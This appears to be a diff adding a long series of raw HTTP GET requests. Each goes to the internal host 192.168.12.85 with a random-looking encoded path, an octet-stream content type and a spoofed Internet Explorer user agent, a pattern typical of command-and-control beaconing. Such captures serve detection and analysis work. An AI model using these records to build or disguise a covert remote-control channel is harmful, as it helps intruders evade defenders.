+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /KbkAIMakIYkAZxVzXp7w5gy2T6lxKJZR8958QDO7Qb5q9JAlenW9Phx3sUc22qsiLmS0W_lK6wGlyJEcKF8oER18cuoCyHb8iern8-2Y6jd5RSIKUc1rzYggrVmq_E1cKAFI6nl5oz2C53Z88RmSlmAh-jTPAwitwD7qfg6KJNUKLSUZU5bpkXe4H10WMhR4Zmnf2GFQY22yDMwB/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /qGBeFkqSpn_G99PjmA42cQOD3KIqsmYm6-vxU_Z6sirZMNDphg2bvXZgJl-7rLlYonerJGKfadpGmxRGq1awWII1axLIKJ/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /eRDlxUjJd0hULkE6CtekpQbeAdPs2WSttUd/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /GvyOvUnlOhl_AWoVIfiPjgjjSx9nWGWRxz8Lbv0Do_/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /3lFACNb-LbR862n_IhKMfwvjEvkFK_TShf_o2lsXlp0fNELPlxn2aPcfFpgMweGLZvN5ZVfhrBVoBv2EkGdyrKv0JRtd-DsNLPRMXu8hUv4JpXyyBYl7DWhAsiae4g5W8MezKvMU6_repfvZSEtA3hMfevX1qwANNSKt2exwEcQtOepRCVd3EJpTuQ9ynMkLd0GWQ8V79DuStSSq6AQ/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /mTbURDkCIZo5OiwuZ8PJowNlCtav0I_bgg9r0g1Sfp2DeXrW9l_T24/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /dg-xu87DedLrqv6-tVMbNwfd-P9BcuwDnZtNHso6MOrgy136X1fFRkQMDtdmJQNBOYMobFVK3qU9xW6f0yOnso9sP7tz1h_3IU-LN-Hrd_2t-oSj2a0J2pm38miiUn50kqUqudVi91RRAnPmWPguJOX5qBlU8oCbWhwWcTKVdxocYtvdr1Ur-CttQEuFh781ZjGrOH5cN3zxL5b0A2_XdfabEv4xEPyZBg/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /fi-ig7sF2iYIwx3XVjr4YQfZexGvr407unS_42oC7QzITbkMs8pskIi_druEu/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /aeiQCTK4GVMwyiXebjPAbADDVt_XKWX95tBad--VurnAZVJnsFqdVK/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /P1lvsRfVGw36au9-pJMKwQe1pxnXfmkZtN4LaPebx6-Zo5lNauR_lVWOn8wkne3ag4zdwOuSSUGQy55DkiCeBEFtfJfTfOBC7oB4Z4fwnk5_51_sgO5sSkBet9IAX4mhsD8AVi07poSxMnZ1BXgPQsJrFsfozslb-l7SjH-NBwu0K_rEpKPtx6qR5yYM5z4eqCgiV5YgaczFIMotEBUOEF51qAVmYsKT3wmwP/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /3IrE8lg2q4mmwrPW-DtWcgsC_GNXFxMhN2W87d9ALlk7XQw1cM-xwnpap4CgQPIOVzCRgCv5-pizFX6oCNzW01Vs-yqC2o/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /75S57bHH_r8jRTZRfbzT8QrLvFkzHnnyv7cTDqAeBIyVVxsqd3jfkVxk6UefbRkHemrKexIY39Ww_ATsGbNzH-PDc2IQLMyypk1pnhmIm8xscmJdUPaNAVioVnn-9S_GUJZ7zZLHQC6Dg7bYFdJQHDrO_rqnMJfB74Z6FCnKrzzLHHNlah/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /gR_y3mnVlQDWpsOyiF8mHw2A9D4O2IjENPlteN06k5y8USV67dlICEl_4193YIUVX0K8I04kJQzSm1Af5I01G_xGwbj5L_TpQcH87Obsj1XDYqJZUWnjx6jCKwcB-XK72lEOB9746-i6Njx6fUJxwbzdJA_kqi9doo/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /JRG0NAgJbgGqNL8g9M1aigX-2zBYAcIPCchv4LIdW3wpIKp9W6xWG_PR1fNnemjN7DJC1d3l2_Dg5uQ6Zc9iV8b_OQOph6FY5w6_ObIuUUuE9v5HbzkSxRYnfOCctc2QEUT4kh8lIbLI3sUmxm3Ao11nUMKG8wlxWBr07TyLXGTuUIKYaiLTaZv3bzW-tRte5uajLZL6kwIufgKJs8L7HVcUVmEUL/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /6bUU_sz5KU28_anp4gRMPwuoOhi9cdbL1ZQWHV4TlpMGpm8RjhM2nVxkMeifnYxxKYIj-8cWeBB0icJta-l5uLID9FnG-MOjU3GX_r6soXg32EoY2y3e9TqorPdxs7j4uVnOO4Kktem-dvNCqPAtCp_OVtGnbr8ZSr4Mj97jyciOvNEj56xwL_uxLSmcnNQwQNw5ETFai-o4Xpl9Ce4oNQw0Kr2rm24G2EK_3ui7XphTagr5p3/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /z6YEoqEqVCXCk9eHnGoyVAtfrWGsIsX0BuGCk-XZ3NuUuGBd9-ZrtAbuZEXlLIPIwUmORum8YISLAZYIRYBvG62JxaMmKNfcPjpUmugHobexR6GDDGxj1k_3s6U8VUl0opB1H6dDifm7G2R2RrZiEMCXZJAtMHHsD3VMWv0-77B8_GiXcso0HO3k0PnWgHx/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /91sVZsSIfIHfjMqYgXUvQAHt-pWPYm258lzPzV-zkVboUnhK24FR_EOgttOUCeNrq_NSWYOmV1tk1IuajDZvr4-oZZh3KNzq2b6NqScJrrDLWGsfVnFzwQofitD88T8-V2-HgRN4iVL59CNW5dVpQNmSZHggBFe5fEjzlBbyU9OBfr8SE6TjMiFyt9TaFGo7isB4eavvieBxrUveGJT8I5EtFN5ttnoLpIbKphS_L/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /1LMZMT5vln5CAlcWHPuy0gazvAWZnqx7UFgF/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /hcVCf5zsYqrBhtSSn38xUwwJ4vlWFe2F68HmfOx-EHgalLqsPTuRY8D85DHc8R0vR0HEZYjQw7jBgcLYJv0u6WtCqi7XZomUKdNjBzK1Ee4n7kLELzq86jkavr4A_5j-zgxKCeSMn4DfBZjfaMaQ-jDS5sIQ5SxGtcziT83O3nC/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /hV9GVa1yuH2wa6V_7pJAsQuqnRZYHKMdmWa7HLCDcnTtTmYJ6XbsoGYCxUB3K-YuhG0BiPM14FEEl51KIQW2POYBjwv0Ge7f6U5b3e80rsQ2RDnt1FlRMI_PFCuApbIC90-EOUCEfb7AjiEkRLyyi20SsR-MLxSml2JW724mUs_BDtPDQ7QPZhssDDhJt3XLoupFOOD1MhUOnMAKRKksCGnS81/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /gadu9q5Xnqphx3TTPz6RGQoqkkUtbzRnDwmXbZ49BwMuxvjzQ-kBE0nGZ4VI/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /Jfk4Ig2a2bIkqjG-elPUSQEcFYBDxjI_uUAoW0vsGd0CENUIqAsqEmLt6dBXfW3gDGLlashJb2T0jDqH3f4xQQZG9Bz4/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /6qEKotiic2xBmlSOH2OxcgSFJRayjLzg43xLckR5YUt94KcBHN8RQQn52NHXBlKXL1vJhly2HXrU/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /A8VloWE3ZuRi0HfEPCmSPADkue9YsT29ckajylV8ZshoKLqJJ7k0Lv-boxuvUPz8ne24OFVzJtzfc0m8x2g_QqH53EF8NBWS-Nd994rXX_nCkjF9xCSNmc54PUvX0mizMeUvIca/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /G_Ues1BOc1e1DKAY6_VF_QJehfkEyf-eFJwksyf6cqUv6Ec9bcR7XmyHpsqJJOuMm6DwyhvN0FitwOzvUa2H5Mg2PS1Yz1M_ftzDcwOOwa4xBp8vw-70LRqrDjG4fI579ykknpgzSYxrgBKyopXrF6mIEr/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /sRwh2E4wK1jA_9XrngYwCgUFciiJddlPAPnnqQNAryr-_2cm0bi3EJyCa3klLQB3T9m0mEbAXiGb52idrBlONMX54TdoDtJ8MblOFJwWETM9MdWC0q6a5IAaZgJppGJHFzrZnOoiRCnkcoEozsNbRyn8ftGYK_sdKcOzAISEfbo8whnz/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /huI9FjjbN8VJHVwJF-S55wq-bX5S7JkDLmRMLk4aRAbch95BQnHPKPijE2PCs8vAJ5W5zRdoS5xtZMjLdfG8PCXiHC-11OwPjh4cjN8YaAf1EDFZKwyDuphlyOHEEM3jY1a/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /mvgcsIc6bVTqef9ttIAahgv6zg-I5pOUP68lbqhEct5HdwbrYOHoD6QZdVS2vXAK9623X0tZvAnOo2Znb1BNwSNz2_lwPlSNUdMIvamKjhi7zRYrqziONtBAcsG6Mr8JJGRWTly8FoZBLVYjzsecxlBJzaXiCUC5thGgx6YAwQxLqjlP0P8iE5NjlHimUR3_N7JNA18WuboIPkk_gekrc16Gi8ln4dV9i/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /C4YTO-4vS7N-H2sLIOaPHAWkcnh3Bt4S4Fu2pNq3b3-whWRW__BV-BOHmGIsXzSQi6Fl6egyhqGTW2ahppGQHBpZsAtw0oxZEnMeJB9_Vd5qQaXCjLMGwzMl1gUVqvm8k5G98RgWLLKhpdZPOd5fMiC3AYrHdYpq9-Zp/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /ZkU3P4KZQu3HUNJEmak2WAoAmPlxvhhAqP7nhwrwKmeRaqpC3jBd_IbP3hTB4_-HZhYN8PpwmUlSR5P4WjadmsKCK/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /vtFrMg75UvfDwNbUnTkyzQ2NpV3dzMlPpvQZVGIi51OxMO289p7flN3yRn8u-zYG5EhK9dan4Zaz8nRDouE7X5jM-kEFc/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /w48j8dMVmrrsifmdsnAdmArAcSIAYDaCiZAeidtoNYG/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /L1GqGYhzXmqFl5CD2250gQB3xiN66fQaPBFMXa6dDFDVvGOtIk63S0rlcoF9-iDzCm3eUjtnIuLXevkY_6Uif4YKQk3jY04vX6070SRLeqgPb14ECP9mBRQPTAc/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /IWGSei569HHWuMOsiEEnowpB2V-CU77uvalOqtltHdcNafitPhfQnfOlBb9mM5wHZeTzIgJLkO7iami6V8P7D4VgH2gJUm-4VEC_bEzOxrph1dW4MQMtF2WO/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /avzFmrY1giCGQZNV2Lh3XgvvJwNpbkN5yLrOO1EoIPHiEFMwXk2W5b3yYNywI0O9kNgKU_gttEwQ_rrXv-7QsWlt43qFwgwOOt-ZHdDGRAnKwXXpDbJ9YkiX7nD207l5TV7s8_y7oZUv57ZZehYx4Ohqi4IqQenFNo/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /dprre645iru9UqhG46tMdgt0Wld_TeKHeJMfKtWuxXGOYv-O64viV7Wkqjyu6rA8JHG8snm1jpUayb2tn3roIhE4-DfgEJu2jmd9xha83VrrbOiMNI/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /iYgWPugSHAb-eettoIAPUAFLr_BTSVg5PtQU7Vi7ihJHB1lew0yLTZ7rwCq9nSXvBuiAqdxh2ZrFzdkP3du5Zu0dBjiU1iDLb3TvR4eD7ILlIPF1PHPMH7btzOVLr7PvnHXSlyIhqwRbdH5bGHkkhFrTmNxUZqtPWDRwMjHqonhvECSW_urp-DpbzSwjjNKbksdwZoa_w4tQLN1f_ru04/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /9PfdFVULHqaA3JXI3iVx8Q0vh7O2gh472kewgOCyRyyjtyUHmV6RoFhxtFCiosxyorgrlV-UMXStJhzoTM63IlCcCpPZQS0f9MQrrzeWGGR7Hp9fYn/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /lwzSK2xNvBEvczpncYreQQ-9AFUfO3_tlWL7A-Hyd-XtIxK1pxyi1lCEJGRFpMskFYP8Z4xdLdgH_Bnx0Bpr8yujQWUPC36nzpl72GfWQwP7Q2P3pKicwDoVNKbP24H7GX9C6m4q9sR198zeC51SJIAnyiFf0aqeNT7Ic0CpSYjQ9_Xe/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
+GET /pCl3RlCvtvAptTyhd0zYggl-706dfXSsHNqsJ1rDS317K2mPhiE0Dvp7BwElYXoqWyyEgCz14eXBrydnnXcfwUxkaT-ZvwPQd2c3nkFK_ZMCSQpAP4MPOInLXNoQj3tKrJQPOk69_60hQH3Frs33TjIm3g6Ags_mbWR/ HTTP/1.1
+Accept-Encoding: identity
+Host: 192.168.12.85:80
+Content-Type: application/octet-stream
+Connection: close
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
+
